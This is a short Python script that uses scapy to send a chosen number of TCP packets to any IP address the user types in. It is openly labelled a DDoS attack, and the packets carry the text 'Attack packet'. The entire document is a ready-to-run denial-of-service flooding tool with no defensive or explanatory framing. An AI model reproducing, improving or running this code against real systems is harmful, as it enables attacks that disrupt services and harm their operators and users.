from scapy.all import *
import random

def perform_ddos_attack(target_ip, packet_count):
    # Create a packet with the specified target IP
    packet = IP(dst=target_ip) / TCP(dport=random.randint(1, 65535)) / "Attack packet"
    
    # Send the packet to the target IP for the specified number of times
    send(packet * packet_count, verbose=False)

# User input for target IP and packet count
target_ip = input("Enter the target IP address: ")
packet_count = int(input("Enter the number of packets to send: "))

perform_ddos_attack(target_ip, packet_count)
